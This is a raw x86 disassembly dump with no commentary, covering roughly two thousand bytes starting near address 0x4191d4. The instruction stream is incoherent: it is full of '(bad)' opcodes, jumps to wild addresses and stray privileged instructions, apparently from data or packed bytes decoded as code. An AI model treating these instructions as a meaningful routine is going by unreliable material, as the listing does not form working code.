  4191d4:	pop    ebp
  4191d5:	pushf  
  4191d6:	mov    esi,DWORD PTR [edx]
  4191d8:	lock mov eax,eax
  4191db:	adc    BYTE PTR [ebx],al
  4191dd:	or     BYTE PTR [ebx+0x4d001001],0xcf
  4191e4:	xor    ebp,DWORD PTR [edi+0x50e45189]
  4191ea:	dec    ebp
  4191eb:	mov    ecx,DWORD PTR [ebx-0x31390304]
  4191f1:	(bad)  
  4191f2:	iret   
  4191f3:	inc    ebp
  4191f4:	(bad)  
  4191f5:	jne    0x419244
  4191f7:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  4191fd:	(bad)  
  4191fe:	cmp    ebx,eax
  419200:	je     0x419188
  419202:	add    edi,edi
  419204:	or     bh,bh
  419206:	dec    ebp
  419207:	inc    ebp
  419208:	mov    esi,DWORD PTR [ebx]
  41920a:	cld    
  41920b:	add    ecx,esi
  41920d:	cmp    ecx,DWORD PTR [eax-0xc]
  419210:	mov    edx,DWORD PTR [edi]
  419212:	or     BYTE PTR [ebp-0x7c],al
  419215:	mov    ebx,DWORD PTR [eax+ebp*8-0x7b7639ce]
  41921c:	or     al,0x9c
  41921e:	inc    ebp
  41921f:	xor    bh,BYTE PTR [ecx+ecx*4]
  419222:	pushf  
  419223:	call   0x5281b3
  419228:	jne    0x4191f1
  41922a:	mov    ebp,esp
  41922c:	fcomp  DWORD PTR [ebx]
  41922e:	add    BYTE PTR [ecx],al
  419230:	inc    DWORD PTR [ebp-0x75]
  419233:	(bad)  
  419234:	cld    
  419235:	add    al,0xce
  419237:	mov    ecx,edi
  419239:	cld    
  41923a:	inc    ebp
  41923b:	fidivr WORD PTR [ebx]
  41923d:	fbstp  TBYTE PTR [ebp-0x3e]
  419240:	mov    eax,DWORD PTR [eax]
  419242:	adc    BYTE PTR [ebx-0x3974038b],cl
  419248:	fadd   st,st(7)
  41924a:	add    BYTE PTR [ebp-0x1],al
  41924d:	mov    ecx,DWORD PTR [esp+edi*8]
  419250:	inc    ebp
  419251:	mov    bh,0xc7
  419254:	loopne 0x41929b
  419256:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  41925c:	sbb    BYTE PTR [ebx],dh
  41925e:	pushf  
  41925f:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  419265:	mov    eax,edi
  419267:	cwde   
  419268:	inc    ebp
  419269:	inc    ebp
  41926a:	jne    0x4191f7
  41926c:	mov    esp,esp
  41926e:	clc    
  41926f:	add    al,0x4d
  419271:	mov    DWORD PTR [ebx],esi
  419273:	or     al,0x33
  419275:	inc    ebp
  419276:	lea    ecx,[ebx-0x398d13fd]
  41927c:	add    bh,al
  41927e:	inc    ebp
  41927f:	ror    DWORD PTR [ebx+0x45d829],0x8b
  419286:	add    ebp,esp
  419288:	shufps xmm1,xmm3,0xc7
  41928c:	(bad)  
  41928d:	jmp    0x7486cdb6
  419292:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  419298:	hlt    
  419299:	mov    ecx,DWORD PTR [edi]
  41929b:	fadd   DWORD PTR [ebp+0x0]
  41929e:	xor    ecx,DWORD PTR [edi]
  4192a0:	add    ecx,ecx
  4192a2:	cmp    edi,edi
  4192a4:	pmuludq mm7,QWORD PTR [edx+0x50]
  4192a8:	(bad)  
  4192a9:	jmp    0x419236
  4192ab:	mov    edi,esp
  4192ad:	or     al,0xc6
  4192af:	inc    ebp
  4192b0:	(bad)  
  4192b1:	mov    eax,DWORD PTR [ebp+0x10]
  4192b4:	jne    0x41923f
  4192b6:	mov    eax,DWORD PTR [ecx]
  4192b8:	clc    
  4192b9:	add    BYTE PTR [ebp-0x40],cl
  4192bc:	xor    edx,DWORD PTR [eax-0x73]
  4192bf:	jne    0x4192c2
  4192c1:	push   DWORD PTR [edx+0x8]
  4192c4:	add    BYTE PTR [ebp+0x45],al
  4192c7:	mov    ebp,ecx
  4192c9:	cld    
  4192ca:	add    BYTE PTR [ebp+0x0],cl
  4192cd:	xor    eax,DWORD PTR [ebp+0x3]
  4192d0:	mov    DWORD PTR [ebx],edi
  4192d2:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  4192d8:	sub    eax,0x5d330e4d
  4192dd:	lea    esi,[ebx]
  4192df:	add    DWORD PTR [ebx],eax
  4192e1:	jb     0x4192cc
  4192e3:	add    BYTE PTR [eax],al
  4192e5:	inc    ebp
  4192e6:	add    bl,ch
  4192e8:	inc    ebp
  4192e9:	mov    esi,DWORD PTR [ebx]
  4192eb:	or     al,0x3
  4192ed:	(bad)  
  4192ee:	mov    edi,eax
  4192f0:	in     al,dx
  4192f1:	scas   eax,DWORD PTR es:[edi]
  4192f2:	inc    ebp
  4192f3:	mov    esi,DWORD PTR [ebx]
  4192f5:	in     al,0x3
  4192f7:	add    al,0x89
  4192f9:	mov    ecx,DWORD PTR [eax+edi*8]
  4192fc:	dec    ebp
  4192fd:	(bad)  
  4192fe:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3164]
  419305:	mov    ecx,eax
  419307:	cld    
  419308:	push   es
  419309:	dec    ebp
  41930a:	add    al,0x33
  41930c:	mov    DWORD PTR [ebx],eax
  41930e:	in     al,dx
  41930f:	cmp    DWORD PTR [ebp-0x67],eax
  419312:	mov    eax,DWORD PTR [ebp-0xba0068]
  419318:	mov    edx,DWORD PTR [ebp-0x4]
  41931b:	mov    ecx,DWORD PTR [ebp-0x18]
  41931e:	xor    ecx,DWORD PTR [ebp+0x3]
  419321:	cmp    DWORD PTR [ebx],0x8b32749b
  419327:	xor    edi,esp
  419329:	jmp    0xff75907b
  41932e:	add    ecx,DWORD PTR [ebp-0x3f]
  419331:	xor    ebx,DWORD PTR [edi]
  419333:	add    eax,ecx
  419335:	cmp    ebx,DWORD PTR [eax]
  419337:	mov    ecx,DWORD PTR [ebp-0x4]
  41933a:	mov    ecx,DWORD PTR [eax]
  41933c:	adc    BYTE PTR [ebp-0x80],al
  41933f:	jmp    0x419342
  419341:	mov    eax,DWORD PTR [eax]
  419343:	cld    
  419344:	mov    bh,0xc6
  419346:	push   ecx
  419347:	(bad)  
  419348:	jne    0x4193a8
  41934a:	dec    ecx
  41934c:	or     BYTE PTR [ecx+ebx*1],cl
  41934f:	push   ebp
  419350:	inc    ebp
  419351:	in     al,dx
  419352:	add    ebp,esp
  419354:	or     bh,al
  419356:	dec    ebp
  419357:	cld    
  419358:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  41935e:	xor    DWORD PTR [eax],0x2
  419361:	pushf  
  419362:	dec    DWORD PTR [ebx+0x45510cf4]
  419368:	mov    DWORD PTR [ebx+0x5545fc0c],ecx
  41936e:	mov    edx,DWORD PTR [ecx+0xc]
  419371:	xor    eax,esi
  419373:	mov    edx,0xc172c7
  419378:	inc    ebp
  419379:	mov    esi,DWORD PTR [ebp+0x8]
  41937c:	mov    eax,edx
  41937e:	call   0x84c65a73
  419383:	add    DWORD PTR [eax+eax*1-0x7476bace],ebx
  41938a:	call   0x4db1a397
  41938f:	push   edi
  419390:	xor    esi,DWORD PTR [ebp+0x3]
  419393:	(bad)  
  419394:	pmulhuw mm0,mm1
  419397:	test   DWORD PTR [ebp-0x8],ecx
  41939a:	mov    DWORD PTR [ebp-0x67],eax
  41939d:	mov    eax,DWORD PTR [ebp-0x4]
  4193a0:	xor    edi,DWORD PTR [ebp-0x73]
  4193a3:	xor    eax,DWORD PTR [ebx]
  4193a5:	xor    esi,DWORD PTR [edx+0x3]
  4193a8:	add    BYTE PTR [ecx],bh
  4193aa:	inc    ebp
  4193ab:	(bad)  
  4193ac:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  4193b2:	mov    DWORD PTR [eax],0x750f0004
  4193b8:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  4193be:	lock add BYTE PTR [ebp+0x0],al
  4193c2:	mov    esi,DWORD PTR [ebp-0x2c]
  4193c5:	mov    ebp,edx
  4193c7:	or     al,0x72
  4193c9:	ja     0x4193cb
  4193cb:	mov    edx,esi
  4193cd:	cld    
  4193ce:	(bad)  
  4193d1:	cli    
  4193d2:	mov    esi,DWORD PTR [ebp-0x4]
  4193d5:	cmp    ecx,esi
  4193d7:	bswap  edi
  4193d9:	(bad)
  4193dd:	mov    esi,DWORD PTR [ebp-0x4]
  4193e0:	mov    esi,ecx
  4193e2:	clc    
  4193e3:	repnz add esi,DWORD PTR [ebp+0x45]
  4193e7:	push   ebx
  4193e8:	xor    eax,DWORD PTR [ebp+0x3]
  4193eb:	xor    bl,BYTE PTR [edi-0x64]
  4193ee:	pop    ebx
  4193ef:	jmp    0x4194b6
  4193f4:	mov    esi,DWORD PTR [ebp-0x7d]
  4193f7:	xor    ebp,DWORD PTR [eax]
  4193f9:	lea    eax,[ebp-0x8]
  4193fc:	xor    edx,esi
  4193fe:	pushf  
  4193ff:	out    dx,eax
  419400:	(bad)  
  419401:	neg    eax
  419403:	ins    DWORD PTR es:[edi],dx
  419404:	test   esi,edi
  419406:	clc    
  419407:	pop    esp
  419408:	inc    ebp
  419409:	or     BYTE PTR [ecx+0x450f0c7d],cl
  41940f:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  419415:	add    cl,al
  419417:	jne    0x4193b5
  419419:	mov    esi,DWORD PTR [edx]
  41941b:	in     al,dx
  41941c:	push   esi
  41941d:	xor    BYTE PTR [ebp-0xe],dh
  419420:	add    edi,esi
  419422:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  419428:	add    cl,bh
  41942a:	mov    edi,DWORD PTR [ebp+0x8]
  41942d:	mov    DWORD PTR [ebp-0x14],esi
  419430:	add    esi,DWORD PTR [ebp+0x3c]
  419433:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  419439:	mov    ah,0x3c
  41943b:	pushf  
  41943c:	pushf  
  41943d:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  419443:	jne    0x4193d0
  419445:	mov    ecx,DWORD PTR [esp+ebp*8]
  419448:	icebp  
  419449:	icebp  
  41944a:	shl    edx,0xf2
  41944d:	(bad)  
  41944e:	mov    ah,0x16
  419450:	pop    eax
  419451:	jne    0x4193e6
  419453:	mov    ecx,DWORD PTR [edi]
  419455:	in     al,dx
  419456:	jmp    0x419449
  419458:	add    dl,dh
  41945a:	mov    edi,esi
  41945c:	or     al,0x8
  41945e:	inc    ebp
  41945f:	jne    0x419464
  419461:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  419467:	ret    
  419468:	or     bh,bh
  41946a:	jge    0x419454
  41946c:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  419472:	xor    edi,eax
  419474:	add    esi,DWORD PTR [ebp-0x77]
  419477:	mov    ebx,esp
  419479:	clc    
  41947a:	neg    DWORD PTR [ebp-0x7c]
  41947d:	xor    eax,DWORD PTR [eax]
  41947f:	cmp    eax,DWORD PTR [eax]
  419481:	repz jne 0x419419
  419484:	xor    eax,DWORD PTR [ecx]
  419486:	add    ebx,DWORD PTR [eax]
  419488:	mov    DWORD PTR [ebp-0x8],eax
  41948b:	mov    eax,edi
  41948d:	cld    
  41948e:	lock pop eax
  419490:	test   DWORD PTR [ebx],esi
  419492:	clc    
  419493:	add    edx,DWORD PTR [edi-0x740bff77]
  419499:	fdivp  st(4),st
  41949b:	test   ecx,esi
  41949d:	(bad)  
  41949e:	jnp    0x41949f
  4194a0:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  4194a6:	jae    0x419433
  4194a8:	sub    edi,esp
  4194aa:	(bad)  
  4194ab:	shl    DWORD PTR [eax-0x3e],0x89
  4194af:	leave  
  4194b0:	call   0x81974bbd
  4194b5:	in     al,dx
  4194b6:	(bad)  
  4194b7:	in     al,dx
  4194b8:	add    bh,al
  4194ba:	mov    esp,edi
  4194bc:	in     al,dx
  4194bd:	test   DWORD PTR [ebp-0x8],edi
  4194c0:	mov    eax,DWORD PTR [ebp+0x2b]
  4194c3:	xor    BYTE PTR [ebx],al
  4194c5:	pushf  
  4194c6:	jnp    0x573090ff
  4194cc:	xor    edx,DWORD PTR [ebp-0x77]
  4194cf:	push   ecx
  4194d0:	loopne 0x419505
  4194d2:	jne    0x41948f
  4194d4:	mov    esi,DWORD PTR [edx-0x20]
  4194d7:	add    BYTE PTR [ebp-0x3d],bh
  4194da:	xor    eax,DWORD PTR [ebp-0x73]
  4194dd:	mov    edi,DWORD PTR [esi]
  4194df:	cld    
  4194e0:	jb     0x4194a8
  4194e2:	add    bl,al
  4194e4:	jne    0x41952b
  4194e6:	mov    edx,DWORD PTR [edi-0x10]
  4194e9:	jge    0x419568
  4194eb:	mov    esi,DWORD PTR [ebx]
  4194ed:	lock add ecx,DWORD PTR [ebp+0x3b]
  4194f1:	xor    esi,DWORD PTR [ebp-0x77]
  4194f4:	mov    esi,eax
  4194f6:	lock inc ebp
  4194f8:	jge    0x41952b
  4194fa:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  419501:	dec    ebp
  419502:	mov    esi,DWORD PTR [ebx]
  419504:	loopne 0x41948f
  419506:	jge    0x419500
  419508:	add    DWORD PTR [ebp-0x7d],eax
  41950b:	icebp  
  41950c:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
  419513:	dec    ebp
  419514:	hlt    
  419515:	xor    ebx,DWORD PTR [ebp-0x77]
  419518:	mov    esi,esp
  41951a:	in     al,0x45
  41951c:	jge    0x41955b
  41951e:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  419525:	dec    ebp
  419526:	pop    esp
  419527:	xor    edx,DWORD PTR [ebx+0x3ec7389]
  41952d:	inc    ebp
  41952e:	hlt    
  41952f:	xor    DWORD PTR [ebp-0x61],esi
  419532:	mov    edi,DWORD PTR [eax+0xf19504]
  419538:	repnz mov DWORD PTR [ebp+0x20],ebx
  41953c:	cmp    eax,DWORD PTR [ebp+0xf]
  41953f:	test   DWORD PTR [edi+ecx*1-0x1],edx
  419543:	fistp  WORD PTR [ebx+0x0]
  419546:	inc    ebp
  419547:	mov    ebx,DWORD PTR [edi+0xc]
  41954a:	add    eax,eax
  41954c:	inc    ebp
  41954d:	test   BYTE PTR [ebx],dh
  41954f:	add    eax,DWORD PTR [ebx]
  419551:	add    BYTE PTR [esi+0x45],bl
  419554:	ret    0x85
  419557:	jnp    0x54421926
  41955d:	inc    bp
  41955f:	inc    ebp
  419560:	xor    DWORD PTR [ecx+0xc78a9c],edi
  419566:	fdiv   QWORD PTR [ebx]
  419568:	test   DWORD PTR [ecx+0x453bf8],edi
  41956e:	push   ebx
  41956f:	add    edi,DWORD PTR [esi+0x708088b]
  419575:	cmp    esi,eax
  419577:	setl   BYTE PTR [ecx-0x74fcffce]
  41957e:	mov    esp,edi
  419580:	call   0x33ccdad2
  419585:	or     BYTE PTR [ebx],al
  419587:	inc    ecx
  419588:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  41958e:	and    BYTE PTR [ebp-0x7074f0bb],al
  419594:	lock add cl,al
  419597:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  41959e:	mov    ch,0x45
  4195a0:	clc    
  4195a1:	xor    eax,DWORD PTR [ebp+0x3]
  4195a4:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  4195aa:	inc    ebp
  4195ab:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  4195b1:	mov    edi,eax
  4195b3:	mov    eax,DWORD PTR [ebp+0x3c]
  4195b6:	mov    ecx,DWORD PTR [eax]
  4195b8:	hlt    
  4195b9:	inc    ebp
  4195ba:	ror    DWORD PTR [ebx+0x818c45],0xf4
  4195c1:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  4195c7:	push   ebp
  4195c8:	mov    edi,DWORD PTR [ebx]
  4195ca:	in     al,dx
  4195cb:	jne    0x41958e
  4195cd:	mov    eax,DWORD PTR [ebp-0x28]
  4195d0:	add    DWORD PTR [eax],0xe8058dec
  4195d6:	clc    
  4195d7:	mov    esi,DWORD PTR [edi-0x8]
  4195da:	add    dh,dl
  4195dc:	rol    WORD PTR [ebp-0x1],cl
  4195e0:	mov    edx,DWORD PTR [eax+0x8]
  4195e3:	jne    0x4195a5
  4195e5:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  4195ec:	inc    ebp
  4195ed:	push   esp
  4195ee:	test   DWORD PTR [ecx+0xf],ecx
  4195f1:	sub    edx,esp
  4195f3:	add    eax,DWORD PTR [eax]
  4195f5:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  4195fb:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  419602:	mov    eax,DWORD PTR [ecx]
  419604:	and    BYTE PTR [eax],al
  419606:	adc    BYTE PTR ds:[eax],al
  419609:	inc    ebp
  41960a:	inc    cx
  41960d:	push   esp
  41960e:	add    al,0x75
  419610:	add    BYTE PTR [edx+0x66],dl
  419613:	enter  0xc1,0x4d
  419617:	mov    esp,DWORD PTR [esi+0x20]
  41961a:	add    DWORD PTR [ecx-0x7b],eax
  41961d:	add    eax,DWORD PTR [ebx]
  41961f:	str    WORD PTR [eax+0x45]
  419623:	lea    ecx,[ebx+0x45890801]
  419629:	sbb    BYTE PTR [ebx],al
  41962b:	dec    ebp
  41962c:	cmp    al,0xf
  41962e:	inc    ebp
  41962f:	push   eax
  419630:	mov    esi,DWORD PTR [ebx]
  419632:	push   eax
  419633:	add    eax,eax
  419635:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  41963c:	inc    ebp
  41963d:	add    BYTE PTR [ecx],dh
  41963f:	add    BYTE PTR [ebp+ecx*2+0x3d4338b],cl
  419646:	(bad)  
  419647:	mov    ebx,eax
  419649:	loopne 0x419690
  41964b:	dec    ebp
  41964c:	mov    ecx,DWORD PTR [edi]
  41964e:	cld    
  41964f:	push   eax
  419650:	xchg   DWORD PTR [ebx],esi
  419652:	add    DWORD PTR [ebx],ebp
  419654:	add    BYTE PTR [ebx],ch
  419656:	or     BYTE PTR [ecx],bh
  419658:	dec    ecx
  419659:	loopne 0x41965e
  41965b:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  419661:	push   ebp
  419662:	add    DWORD PTR [ebx+0x55100800],eax
  419668:	dec    ebp
  419669:	jmp    0x4195f4
  41966b:	mov    esp,DWORD PTR [eax]
  41966d:	sbb    dl,dl
  41966f:	inc    eax
  419670:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  419676:	add    BYTE PTR [ebx+0x74528555],cl
  41967c:	push   ebp
  41967d:	div    DWORD PTR [ebx]
  41967f:	and    eax,DWORD PTR [ebx]
  419681:	add    edx,DWORD PTR [edx-0x30]
  419684:	jno    0x419611
  419686:	inc    DWORD PTR [eax+eiz*1]
  419689:	inc    ebp
  41968a:	push   eax
  41968b:	push   eax
  41968c:	mov    esp,DWORD PTR [edi-0x74beff1c]
  419692:	mov    edi,esp
  419694:	push   eax
  419695:	inc    ebp
  419696:	enter  0x458b,0x8
  41969a:	push   ecx
  41969b:	(bad)  
  41969c:	call   0x10ba074
  4196a1:	pop    ss
  4196a2:	push   ebp
  4196a3:	mov    ecx,DWORD PTR [ebx+0x489408]
  4196a9:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  4196af:	push   ecx
  4196b0:	jo     0x41969a
  4196b2:	inc    DWORD PTR [edi]
  4196b4:	or     BYTE PTR [eax],al
  4196b6:	call   0xcc9e00
  4196bb:	fmul   QWORD PTR [ebp+0x55]
  4196be:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  4196c4:	mov    bh,0x8c
  4196c6:	adc    al,0x9c
  4196c8:	dec    esp
  4196c9:	xor    bl,BYTE PTR [eax]
  4196cb:	mov    ecx,DWORD PTR [ebp+0xc]
  4196ce:	mov    eax,DWORD PTR [ebp-0x4]
  4196d1:	mov    esi,DWORD PTR [edi-0x3148f924]
  4196d7:	push   es
  4196d8:	retf   
  4196d9:	mov    BYTE PTR [ebp-0x30],0x3b
  4196dd:	inc    ebp
  4196de:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  4196e5:	retf   0x83fc
  4196e8:	into   
  4196e9:	dec    ebp
  4196ea:	retf   
  4196eb:	mov    ecx,DWORD PTR [ebp-0x74]
  4196ee:	mov    eax,DWORD PTR [eax]
  4196f0:	fdiv   QWORD PTR [ebx]
  4196f2:	mov    bh,0x3
  4196f4:	push   es
  4196f5:	mov    esi,ecx
  4196f7:	sbb    cl,dl
  4196f9:	dec    ebp
  4196fa:	sar    DWORD PTR [ebx],cl
  4196fc:	push   ebp
  4196fd:	jne    0x41970e
  4196ff:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  419705:	lea    ebx,[eax]
  419707:	call   0xf4cb22ce
  41970c:	sbb    dh,dl
  41970e:	add    edx,ebx
  419710:	push   ebp
  419711:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  419717:	push   ecx
  419718:	mov    DWORD PTR [eax-0x30],edx
  41971b:	test   DWORD PTR [edx],eax
  41971d:	xadd   esp,esi
  419720:	pop    es
  419721:	add    cl,dl
  419723:	mov    eax,ecx
  419725:	or     al,0x45
  419727:	(bad)  
  419728:	push   eax
  419729:	add    DWORD PTR [edx+0x0],eax
  41972c:	add    ecx,DWORD PTR [ecx]
  41972e:	and    dh,cl
  419730:	call   0xc5a000
  419735:	add    DWORD PTR [ebp+0x0],edx
  419738:	mov    esp,DWORD PTR [ebp+0x18]
  41973b:	add    BYTE PTR [eax+0x54],cl
  41973e:	xor    eax,DWORD PTR [eax]
  419740:	add    esp,DWORD PTR [esi+0x3b]
  419743:	inc    ebp
  419744:	je     0x4196c9
  419746:	push   ecx
  419747:	cli    
  419748:	dec    ebp
  419749:	mov    DWORD PTR [ebx],eax
  41974b:	(bad)  
  41974c:	or     al,0x5e
  41974e:	inc    eax
  41974f:	add    BYTE PTR [ebx],al
  419751:	data16 and BYTE PTR [ebp+0x50],al
  419755:	sub    DWORD PTR [ecx],0xfffffff8
  419758:	add    BYTE PTR [ebp-0x75],ah
  41975b:	add    BYTE PTR [eax],bl
  41975d:	enter  0x894d,0x8b
  419761:	int3   
  419762:	loopne 0x419726
  419764:	rol    BYTE PTR [eax],0x33
  419767:	lea    cx,[ebp+0xa]
  41976b:	data16 jb 0x4197b3
  41976e:	add    BYTE PTR [ebx+0x44890855],cl
  419774:	sbb    ah,al
  419776:	inc    ebp
  419777:	lldt   WORD PTR ds:[edx+0x66]
  41977c:	xor    ecx,DWORD PTR [eax]
  41977e:	sub    eax,DWORD PTR [ebx+ecx*4]
  419781:	add    BYTE PTR [esi+eiz*2],cl
  419784:	ror    edx,cl
  419786:	dec    ebp
  419787:	inc    ebp
  419788:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  41978e:	cld    
  41978f:	or     BYTE PTR [edi+0x4501dd],dl
  419795:	(bad)  
  419796:	into   
  419797:	out    dx,al
  419798:	retf   
  419799:	(bad)  
  41979a:	dec    ebp
  41979b:	mov    al,0x8b
  41979d:	loop   0x4197bf
  41979f:	cmp    ecx,DWORD PTR [edx]
  4197a1:	inc    ebp
  4197a2:	daa    
  4197a3:	loop   0x41972c
  4197a5:	out    dx,al
  4197a6:	add    edi,eax
  4197a8:	add    BYTE PTR [eax+0x3f52e155],bh
  4197ae:	push   ebp
  4197af:	inc    ebp
  4197b0:	xor    ebx,esp
  4197b2:	add    ebp,esi
  4197b4:	push   edx
  4197b5:	push   bp
  4197b7:	inc    ebp
  4197b8:	(bad)  
  4197b9:	in     eax,dx
  4197ba:	push   esp
  4197bb:	(bad)  
  4197bc:	inc    edx
  4197be:	sbb    al,0x33
  4197c0:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  4197c7:	add    BYTE PTR [ebp+0x47],0x8b
  4197cb:	jmp    0xf98b:0x100041c8
  4197d2:	xor    esi,DWORD PTR [edx+0x3]
  4197d5:	mov    ecx,DWORD PTR [edi]
  4197d7:	fmul   DWORD PTR [edx]
  4197d9:	add    BYTE PTR [eax],al
  4197db:	lea    eax,[ebx-0x4700273c]
  4197e1:	add    al,0x4f
  4197e3:	pop    DWORD PTR [eax]
  4197e5:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  4197eb:	push   edx
  4197ec:	inc    WORD PTR [ebp+0x8]
  4197f0:	mov    eax,0x514f4d
  4197f5:	(bad)
  4197f9:	add    al,al
  4197fb:	xor    DWORD PTR [ebx-0x74baf730],eax
  419801:	test   DWORD PTR [esi+0x74],esp
  419804:	inc    ebp
  419805:	mov    DWORD PTR [eax+0xa4e08],edi
  41980b:	add    BYTE PTR [ecx-0x76c435bb],cl
  419811:	or     dh,cl
  419813:	or     eax,0x8b8d5045
  419818:	inc    ebp
  419819:	mov    WORD PTR [ecx+0x3b8a00],?
  41981f:	jne    0x419854
  419821:	mov    edi,DWORD PTR [edx+0x8f3b18]
  419827:	add    DWORD PTR [ebx],eax
  419829:	add    bh,bh
  41982b:	adc    DWORD PTR [eax],ecx
  41982d:	adc    DWORD PTR [ebp+0x55],edi
  419830:	push   es
  419831:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  419837:	mov    ebp,DWORD PTR [eax+ebp*1+0x503a11dc]
  41983e:	inc    ebp
  41983f:	mov    esp,edi
  419841:	or     al,0xdc
  419843:	push   eax
  419844:	(bad)  
  419845:	jne    0x4197fb
  419847:	call   0x399138
  41984c:	inc    ebp
  41984d:	sar    BYTE PTR [edx],0x84
  419850:	out    dx,al
  419851:	add    bh,al
  419853:	add    BYTE PTR [ebp+esi*2-0x247424],bh
  41985a:	(bad)  
  41985b:	and    al,al
  41985d:	fs in  eax,dx
  41985f:	inc    DWORD PTR [ebp-0x7b]
  419862:	jo     0x419873
  419864:	leave  
  419865:	scas   al,BYTE PTR es:[edi]
  419866:	inc    esp
  419867:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  41986e:	or     BYTE PTR [ebx-0x97717c9],0x83
  419875:	call   DWORD PTR [edi]
  419877:	shr    ah,0x84
  41987a:	xchg   DWORD PTR [eax],eax
  41987c:	add    DWORD PTR [eax],eax
  41987e:	add    bh,bh
  419880:	dec    ebp
  419881:	and    BYTE PTR [ecx-0x38],dl
  419884:	push   eax
  419885:	dec    DWORD PTR [ebx+0xfd885]
  41988b:	mov    BYTE PTR [ebp+0x508bac00],cl
  419891:	mov    WORD PTR [ecx+0x0],ss
  419894:	lea    ecx,[ebx+0x108b20d8]
  41989a:	mov    WORD PTR [edx],ds
  41989c:	add    BYTE PTR [edi+0xff01ff],al
  4198a2:	mov    ecx,DWORD PTR [ebp-0x28]
  4198a5:	push   ecx
  4198a6:	shl    BYTE PTR [ebp+0x3a],0x8b
  4198aa:	inc    ebp
  4198ab:	in     al,0xeb
  4198ad:	jno    0x41983a
  4198af:	push   edx
  4198b0:	mov    DWORD PTR [eax-0x28],edx
  4198b3:	mov    eax,DWORD PTR [ebp+0x20]
  4198b6:	je     0x41983f
  4198b8:	mov    eax,DWORD PTR [ecx]
  4198ba:	sbb    BYTE PTR [eax],al
  4198bc:	pop    DWORD PTR [eax]
  4198be:	add    esi,eax
  4198c0:	add    bl,al
  4198c2:	adc    DWORD PTR [edi],esi
  4198c4:	jmp    0x8bcce916
  4198c9:	sub    BYTE PTR [ebp+eax*2-0x63c4cf00],cl
  4198d0:	jne    0x41985d
  4198d2:	mov    ecx,DWORD PTR [eax]
  4198d4:	in     al,0x75
  4198d6:	pop    DWORD PTR [ecx+0x5501]
  4198dc:	push   edx
  4198dd:	inc    DWORD PTR [ebx]
  4198df:	adc    BYTE PTR [ecx+0x45721cc6],cl
  4198e5:	add    BYTE PTR [edi+0x9],dl
  4198e8:	call   DWORD PTR [esi]
  4198ea:	and    dl,al
  4198ec:	and    bh,bh
  4198ee:	inc    edi
  4198f0:	test   eax,edx
  4198f2:	sldt   ebx
  4198f5:	xor    BYTE PTR [eax],al
  4198f7:	pushf  
  4198f8:	(bad)  
  4198f9:	jmp    0x419907
  4198fb:	mov    eax,edi
  4198fd:	or     al,0x75
  4198ff:	inc    eax
  419900:	call   0x419008
  419905:	mov    eax,eax
  419907:	loopne 0x41988d
  419909:	inc    ebp
  41990a:	add    BYTE PTR [ebx+0x1451c00],cl
  419910:	mov    eax,DWORD PTR [ebp+0x20]
  419913:	add    edi,ecx
  419915:	add    BYTE PTR [eax],ch
  419917:	cmp    edi,0x18
  41991a:	test   DWORD PTR [ebp+0xf],esi
  41991d:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  419924:	jne    0x419928
  419926:	call   0xffa093eb
  41992b:	leave  
  41992c:	rcr    BYTE PTR [esp+eax*4],0x55
  419930:	add    ah,ch
  419932:	add    BYTE PTR [edi-0x48fef979],dh
  419938:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  41993f:	inc    esp
  419940:	mov    ebx,DWORD PTR [eax]
  419942:	fcom   st(2)
  419944:	add    BYTE PTR [edi],bl
  419946:	lea    ecx,[eax-0x18]
  419949:	(bad)  
  41994a:	push   DWORD PTR [ecx]
  41994c:	call   0xffb3e6ae
  419951:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  419955:	fstp   DWORD PTR [esi+ebx*8]
  419958:	push   ebp
  419959:	pop    ebp
  41995a:	mov    esi,DWORD PTR [edx-0x38]
  41995d:	add    DWORD PTR [eax],0x28
  419960:	mov    edi,DWORD PTR [ebx]
  419962:	xor    esi,DWORD PTR [edx+0x3]
  419965:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  419969:	pop    ebp
  41996a:	or     al,0x4
  41996c:	inc    ecx
  41996d:	push   ebp
  41996e:	(bad)  
  41996f:	in     al,dx
  419970:	or     ah,ch
  419972:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419973:	xbegin 0xffc70f69
  419979:	clc    
  41997a:	adc    al,0x45
  41997c:	div    BYTE PTR [eax]
